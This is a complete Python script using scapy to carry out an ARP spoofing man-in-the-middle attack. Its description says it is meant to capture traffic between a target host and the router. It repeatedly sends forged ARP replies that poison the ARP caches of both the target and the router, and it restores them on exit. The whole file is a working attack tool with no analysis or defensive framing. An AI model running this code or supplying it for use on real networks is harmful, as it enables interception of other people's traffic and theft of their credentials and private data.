import scapy.all as scapy
import time
import argparse
 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
 
def spoof(destination_ip, spoof_ip, destination_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)
 
def restore_router(router_ip,router_mac,target_ip,target_mac):
    packet = scapy.ARP(op=2, pdst=router_ip,hwdst=router_mac,psrc=target_ip, hwsrc=target_mac )
    scapy.send(packet, verbose=False)
 
def restore_target(target_ip, target_mac,router_ip,router_mac):
    packet =  scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=router_ip, hwsrc= router_mac )
    scapy.send(packet, verbose=False)
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='arp spoofer', description='capture traffic in between a target IP on the local network and the router to become the man in the middle')
    parser.add_argument('target_ip', help='target ip to intercept traffic from')
    parser.add_argument('router_ip', help='router ip to intercept traffic from')
    args = parser.parse_args()
 
    packets_sent = 0
 
    try:
        router_mac = get_mac(args.router_ip)
        target_mac = get_mac(args.target_ip)
        while True:
 
            #tell target we are the router
            spoof(args.target_ip,args.router_ip, target_mac)
 
            #tell the router we are the target
            spoof(args.router_ip,args.target_ip, router_mac)
 
            packets_sent = packets_sent + 2
 
            print(f"[+] packets sent: {packets_sent}",end="\r")
 
            time.sleep(2)
 
    except KeyboardInterrupt:
        print("\n[+] Detected ctrl + c ..... restoring arp tables then quitting")
        restore_target(args.target_ip, target_mac, args.router_ip, router_mac)
        restore_router(args.router_ip, router_mac, args.target_ip, target_mac)

